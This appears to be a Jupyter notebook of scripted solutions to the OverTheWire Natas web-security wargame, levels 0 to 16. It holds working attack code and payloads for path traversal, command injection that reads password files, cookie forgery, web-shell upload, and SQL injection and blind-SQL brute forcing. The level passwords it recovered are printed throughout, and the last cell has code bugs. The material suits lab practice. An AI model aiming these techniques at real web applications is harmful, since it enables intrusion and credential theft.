{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [],
   "source": [
    "import requests\n",
    "import yaml\n",
    "import re\n",
    "import base64\n",
    "import urllib.parse\n",
    "from IPython.display import clear_output\n",
    "import threading\n",
    "\n",
    "pwd = None\n",
    "\n",
    "def get_pwd():\n",
    "    global pwd\n",
    "    with open('password.yml', 'r') as f:\n",
    "        pwd = yaml.safe_load(f)\n",
    "\n",
    "def save_pwd(id, pw):\n",
    "    global pwd\n",
    "    with open('password.yml', 'w') as f:\n",
    "        pwd[id] = pw\n",
    "        yaml.dump(pwd, f)\n",
    "\n",
    "def find_pwd(res, count):\n",
    "    pattern = r'[\\w\\d]{32}'\n",
    "    mat = re.findall(pattern, res.text)\n",
    "    natas = f'natas{count}'\n",
    "    if mat:\n",
    "        for m in mat:\n",
    "            if m != pwd[natas]:\n",
    "                print(f'password found: f{m}')\n",
    "                save_pwd(f'natas{count + 1}', m)\n",
    "                return True\n",
    "    \n",
    "    print(f'password not found.')\n",
    "    print(res.text)\n",
    "    return False\n",
    "\n",
    "def start_task(task, count=5):\n",
    "    thread_list = []\n",
    "    for i in range(count):\n",
    "        thread_list.append(threading.Thread(target=task))\n",
    "    for thread in thread_list:\n",
    "        thread.start()\n",
    "    for thread in thread_list:\n",
    "        thread.join()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 30,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "password found: f0nzCigAq7t2iALyvU9xcHlYN4MlkIwlq\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "True"
      ]
     },
     "execution_count": 30,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# natas0\n",
    "count = 0\n",
    "\n",
    "get_pwd()\n",
    "natas = f'natas{count}'\n",
    "url = f'http://natas{count}.natas.labs.overthewire.org/'\n",
    "res = requests.get(url, auth=(natas, pwd[natas]))\n",
    "\n",
    "find_pwd(res, count)\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 33,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "password found: fTguMNxKo1DSa1tujBLuZJnDUlCcUAPlI\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "True"
      ]
     },
     "execution_count": 33,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# natas1\n",
    "count = 1\n",
    "\n",
    "get_pwd()\n",
    "natas = f'natas{count}'\n",
    "url = f'http://natas{count}.natas.labs.overthewire.org/'\n",
    "res = requests.get(url, auth=(natas, pwd[natas]))\n",
    "\n",
    "find_pwd(res, count)\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 36,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "password found: f3gqisGdR0pjm6tpkDKdIWO2hSvchLeYH\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "True"
      ]
     },
     "execution_count": 36,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# natas2\n",
    "count = 2\n",
    "\n",
    "get_pwd()\n",
    "natas = f'natas{count}'\n",
    "url = f'http://natas{count}.natas.labs.overthewire.org/files/users.txt'\n",
    "res = requests.get(url, auth=(natas, pwd[natas]))\n",
    "\n",
    "find_pwd(res, count)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 39,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "password found: fQryZXc2e0zahULdHrtHxzyYkj59kUxLQ\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "True"
      ]
     },
     "execution_count": 39,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# natas3\n",
    "count = 3\n",
    "\n",
    "get_pwd()\n",
    "natas = f'natas{count}'\n",
    "url = f'http://natas{count}.natas.labs.overthewire.org/s3cr3t/users.txt'\n",
    "res = requests.get(url, auth=(natas, pwd[natas]))\n",
    "\n",
    "find_pwd(res, count)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 41,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "password found: f0n35PkggAPm2zbEpOU802c0x0Msn1ToK\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "True"
      ]
     },
     "execution_count": 41,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# natas4\n",
    "count = 4\n",
    "\n",
    "get_pwd()\n",
    "natas = f'natas{count}'\n",
    "url = f'http://natas{count}.natas.labs.overthewire.org'\n",
    "header = {'Referer': 'http://natas5.natas.labs.overthewire.org/'}\n",
    "res = requests.get(url, auth=(natas, pwd[natas]), headers=header)\n",
    "\n",
    "find_pwd(res, count)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 44,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "password found: f0RoJwHdSKWFTYR5WuiAewauSuNaBXned\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "True"
      ]
     },
     "execution_count": 44,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# natas5\n",
    "count = 5\n",
    "\n",
    "get_pwd()\n",
    "natas = f'natas{count}'\n",
    "url = f'http://natas{count}.natas.labs.overthewire.org'\n",
    "cookies = {'loggedin': '1'}\n",
    "res = requests.get(url, auth=(natas, pwd[natas]), cookies=cookies)\n",
    "\n",
    "find_pwd(res, count)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 68,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "<?\n",
      "$secret = \"FOEIUWGHFEEUHOFUOIU\";\n",
      "?>\n",
      "\n",
      "password found: fbmg8SvU1LizuWjx3y7xkNERkHxGre0GS\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "True"
      ]
     },
     "execution_count": 68,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# natas6\n",
    "count = 6\n",
    "\n",
    "get_pwd()\n",
    "natas = f'natas{count}'\n",
    "url = f'http://natas{count}.natas.labs.overthewire.org/includes/secret.inc'\n",
    "res = requests.get(url, auth=(natas, pwd[natas]))\n",
    "print(res.text)\n",
    "\n",
    "url = f'http://natas{count}.natas.labs.overthewire.org/index.php'\n",
    "data = {\"secret\": \"FOEIUWGHFEEUHOFUOIU\", \"submit\": \"submit\"}\n",
    "res = requests.post(url, auth=(natas, pwd[natas]), data=data)\n",
    "\n",
    "find_pwd(res, count)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 52,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "password found: fxcoXLmzMkoIP9D7hlgPlh9XD7OgLAe5Q\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "True"
      ]
     },
     "execution_count": 52,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# natas7\n",
    "count = 7\n",
    "\n",
    "get_pwd()\n",
    "natas = f'natas{count}'\n",
    "url = f'http://natas{count}.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8'\n",
    "res = requests.get(url, auth=(natas, pwd[natas]))\n",
    "\n",
    "find_pwd(res, count)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 72,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "secret: oubWYf2kBq\n",
      "password found: fZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "True"
      ]
     },
     "execution_count": 72,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# natas8\n",
    "count = 8\n",
    "\n",
    "encodedSecret = \"3d3d516343746d4d6d6c315669563362\"\n",
    "secret = base64.decodebytes(bytes.fromhex(encodedSecret)[::-1]).decode()\n",
    "print(f'secret: {secret}')\n",
    "\n",
    "get_pwd()\n",
    "natas = f'natas{count}'\n",
    "data = {'secret': secret, 'submit': 'submit'}\n",
    "url = f'http://natas{count}.natas.labs.overthewire.org/index.php'\n",
    "res = requests.post(url, auth=(natas, pwd[natas]), data=data)\n",
    "\n",
    "find_pwd(res, count)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 75,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "password found: ft7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "True"
      ]
     },
     "execution_count": 75,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# natas9\n",
    "count = 9\n",
    "\n",
    "#1 dictionary.txt; find / -type d -name \"natas*\";\n",
    "#1 dictionary.txt; ls /etc/natas_webpass;\n",
    "#1 dictionary.txt; cat /etc/natas_webpass/natas10;\n",
    "needle = \"1 dictionary.txt; cat /etc/natas_webpass/natas10;\"\n",
    "\n",
    "get_pwd()\n",
    "natas = f'natas{count}'\n",
    "url = f'http://natas{count}.natas.labs.overthewire.org/index.php?needle={urllib.parse.quote(needle)}'\n",
    "res = requests.get(url, auth=(natas, pwd[natas]))\n",
    "\n",
    "find_pwd(res, count)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 76,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "password found: fUJdqkK1pTu6VLt9UHWAgRZz6sVUZ3lEk\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "True"
      ]
     },
     "execution_count": 76,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# natas10\n",
    "count = 10\n",
    "needle = \" -e '.' /etc/natas_webpass/* #\"\n",
    "\n",
    "get_pwd()\n",
    "natas = f'natas{count}'\n",
    "url = f'http://natas{count}.natas.labs.overthewire.org/index.php?needle={urllib.parse.quote(needle)}'\n",
    "res = requests.get(url, auth=(natas, pwd[natas]))\n",
    "\n",
    "find_pwd(res, count)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 119,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "{'data': 'HmYkBwozJw4WNyAAFyB1VUcqOE1JZjUIBis7ABdmbU1GIjEJAyIxTRg%3D'}\n",
      "HmYkBwozJw4WNyAAFyB1VUcqOE1JZjUIBis7ABdmbU1GIjEJAyIxTRg=\n",
      "a: b'\\x1ef$\\x07\\n3\\'\\x0e\\x167 \\x00\\x17 uUG*8MIf5\\x08\\x06+;\\x00\\x17fmMF\"1\\t\\x03\"1M\\x18'\n",
      "b: b'{\"showpassword\":\"no\",\"bgcolor\":\"#ffffff\"}'\n",
      "key: [101, 68, 87, 111]\n",
      "cookie: [30, 102, 36, 7, 10, 51, 39, 14, 22, 55, 32, 0, 23, 32, 117, 85, 71, 61, 50, 28, 71, 104, 117, 13, 2, 39, 56, 3, 10, 54, 117, 85, 71, 103, 49, 9, 3, 34, 49, 9, 71, 57]\n",
      "{'data': 'HmYkBwozJw4WNyAAFyB1VUc9MhxHaHUNAic4Awo2dVVHZzEJAyIxCUc5'}\n",
      "password found: fyZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "True"
      ]
     },
     "execution_count": 119,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# natas11\n",
    "count = 11\n",
    "\n",
    "get_pwd()\n",
    "natas = f'natas{count}'\n",
    "url = f'http://natas{count}.natas.labs.overthewire.org/index.php'\n",
    "res = requests.get(url, auth=(natas, pwd[natas]))\n",
    "\n",
    "cookies = {}\n",
    "for cookie in res.cookies:\n",
    "    cookies[cookie.name] = cookie.value\n",
    "print(cookies)\n",
    "\n",
    "a = urllib.parse.unquote(cookies['data'])\n",
    "print(a)\n",
    "a = base64.b64decode(a)\n",
    "b = b'{\"showpassword\":\"no\",\"bgcolor\":\"#ffffff\"}'\n",
    "print(f'a: {a}')\n",
    "print(f'b: {b}')\n",
    "\n",
    "key = []\n",
    "for i in range(len(b)):\n",
    "    key += [b[i] ^ a[i]]\n",
    "key = key[:4]\n",
    "print(f'key: {key}')\n",
    "\n",
    "text = b'{\"showpassword\":\"yes\",\"bgcolor\":\"#ffffff\"}'\n",
    "cookie = []\n",
    "for i in range(len(text)):\n",
    "    cookie += [text[i] ^ key[i % len(key)]]\n",
    "print(f\"cookie: {cookie}\")\n",
    "\n",
    "url = f'http://natas{count}.natas.labs.overthewire.org/index.php'\n",
    "cookies['data'] = base64.b64encode(bytes(cookie)).decode()\n",
    "print(cookies)\n",
    "res = requests.get(url, auth=(natas, pwd[natas]), cookies=cookies)\n",
    "\n",
    "find_pwd(res, count)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 28,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "password found: ftrbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC\n"
     ]
    }
   ],
   "source": [
    "# natas12\n",
    "count = 12\n",
    "\n",
    "get_pwd()\n",
    "natas = f'natas{count}'\n",
    "url = f'http://natas{count}.natas.labs.overthewire.org/index.php'\n",
    "files = {\"uploadedfile\": ('natas12.php', open('natas12.php', 'rb'), 'multipart/form-data')}\n",
    "data = {\"filename\": \"1.php\", \"submit\": \"submit\"}\n",
    "res = requests.post(url, auth=(natas, pwd[natas]), files=files, data=data)\n",
    "\n",
    "pattern = r'upload\\/[\\w\\d]{10}\\.php'\n",
    "mat = re.findall(pattern, res.text)\n",
    "if mat:\n",
    "    url = f'http://natas{count}.natas.labs.overthewire.org/{mat[0]}'\n",
    "    res = requests.get(url, auth=(natas, pwd[natas]))\n",
    "    find_pwd(res, count)\n",
    "else:\n",
    "    print('not found.')\n",
    "    print(res.text)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 29,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "password found: fz3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ\n"
     ]
    }
   ],
   "source": [
    "# natas13\n",
    "count = 13\n",
    "\n",
    "get_pwd()\n",
    "natas = f'natas{count}'\n",
    "url = f'http://natas{count}.natas.labs.overthewire.org/index.php'\n",
    "files = {\"uploadedfile\": ('natas13.php', open('natas13.php', 'rb'), 'multipart/form-data')}\n",
    "data = {\"filename\": \"1.php\", \"submit\": \"submit\"}\n",
    "res = requests.post(url, auth=(natas, pwd[natas]), files=files, data=data)\n",
    "\n",
    "pattern = r'upload\\/[\\w\\d]{10}\\.php'\n",
    "mat = re.findall(pattern, res.text)\n",
    "if mat:\n",
    "    url = f'http://natas{count}.natas.labs.overthewire.org/{mat[0]}'\n",
    "    res = requests.get(url, auth=(natas, pwd[natas]))\n",
    "    find_pwd(res, count)\n",
    "else:\n",
    "    print('not found.')\n",
    "    print(res.text)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 34,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "password found: fSdqIqBsFcz3yotlNYErZSZwblkm0lrvx\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "True"
      ]
     },
     "execution_count": 34,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# natas14\n",
    "count = 14\n",
    "\n",
    "get_pwd()\n",
    "natas = f'natas{count}'\n",
    "username = 'natas15\";#'\n",
    "password = \"123\"\n",
    "url = f'http://{natas}.natas.labs.overthewire.org/index.php?username={urllib.parse.quote(username)}&password={urllib.parse.quote(password)}&debug=0'\n",
    "res = requests.get(url, auth=(natas, pwd[natas]))\n",
    "\n",
    "find_pwd(res, count)\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "--------------------------------------------------\n",
      "current password: hPkjKYviLQctEW33QmuXL6eDVfMW4sGo\n",
      "--------------------------------------------------\n",
      "--------------------------------------------------\n",
      "password found: hPkjKYviLQctEW33QmuXL6eDVfMW4sGo\n",
      "--------------------------------------------------\n"
     ]
    }
   ],
   "source": [
    "# natas15\n",
    "count = 15\n",
    "\n",
    "get_pwd()\n",
    "natas = f'natas{count}'\n",
    "\n",
    "def try_inject(username):\n",
    "    url = f\"http://{natas}.natas.labs.overthewire.org/index.php?username={urllib.parse.quote(username)}&debug=0\"\n",
    "    result = requests.get(url, auth=(natas, pwd[natas])).text\n",
    "    return \"This user exists.\" in result\n",
    "\n",
    "username = 'natas16\" and BINARY password like \"'\n",
    "password = \"\"\n",
    "\n",
    "letter_list = \"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789\"\n",
    "current_letter_list = [x for x in letter_list]\n",
    "\n",
    "def task():\n",
    "    global current_letter_list, password\n",
    "    while len(password) < 32:\n",
    "        c = current_letter_list.pop()\n",
    "        print(f\"trying {password}{c}\")\n",
    "        if try_inject(f\"{username}{password}{c}%\"):\n",
    "            clear_output()\n",
    "            password += c\n",
    "            print(\"-\" * 50)\n",
    "            print(f\"current password: {password}\")\n",
    "            print(\"-\" * 50)\n",
    "            current_letter_list = [x for x in letter_list]\n",
    "\n",
    "thread_list = []\n",
    "for i in range(5):\n",
    "    thread_list.append(threading.Thread(target=task))\n",
    "for thread in thread_list:\n",
    "    thread.start()\n",
    "for thread in thread_list:\n",
    "    thread.join()\n",
    "\n",
    "print(\"-\" * 50)\n",
    "print(f\"password found: {password}\")\n",
    "print(\"-\" * 50)\n",
    "save_pwd(\"natas16\", password)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "#natas16\n",
    "count = 16\n",
    "\n",
    "get_pwd()\n",
    "natas = f'natas{count}'\n",
    "\n",
    "# get all characters in the password\n",
    "key_list = []\n",
    "key = \"x\"\n",
    "for c in \"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789\":\n",
    "    command = \"$(grep -oh {0} /etc/natas_webpass/natas17)\".format(c)\n",
    "    url = f\"http://{natas}.natas.labs.overthewire.org/index.php?needle={command}&submit=Search\"\n",
    "    response = requests.get(url, auth=(natas, pwd[natas]))\n",
    "    if len(response.text) != 461926:\n",
    "        print(c, len(response.text))\n",
    "        key_list.append(c)\n",
    "\n",
    "current_key_list = key_list\n",
    "key_list = \"\".join(key_list)\n",
    "print(key_list)\n",
    "\n",
    "# get all characters in the password\n",
    "key = \"\"\n",
    "\n",
    "def task():\n",
    "    global key\n",
    "    while len(key) < 32:\n",
    "        new_key = key + c\n",
    "        print(f\"trying: {new_key}\")\n",
    "        command = \"$(grep -oh ^{0} /etc/natas_webpass/natas17)\".format(new_key)\n",
    "        url = f\"http://{natas}.natas.labs.overthewire.org/index.php?needle={command}&submit=Search\"\n",
    "        response = requests.get(url, auth=(natas, pwd[natas]))\n",
    "        if len(response.text) != 461926:\n",
    "            clear_output()\n",
    "            key = new_key\n",
    "            print(\"-\" * 50)\n",
    "            print(f\"current password: {key}\")\n",
    "            print(\"-\" * 50)\n",
    "            break\n",
    "\n",
    "thread_list = []\n",
    "for i in range(5):\n",
    "    thread_list.append(threading.Thread(target=task))\n",
    "for thread in thread_list:\n",
    "    thread.start()\n",
    "for thread in thread_list:\n",
    "    thread.join()\n",
    "\n",
    "print(\"-\" * 50)\n",
    "print(f\"password found: {key}\")\n",
    "print(\"-\" * 50)\n",
    "save_pwd(\"natas17\", password)"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.11.9"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
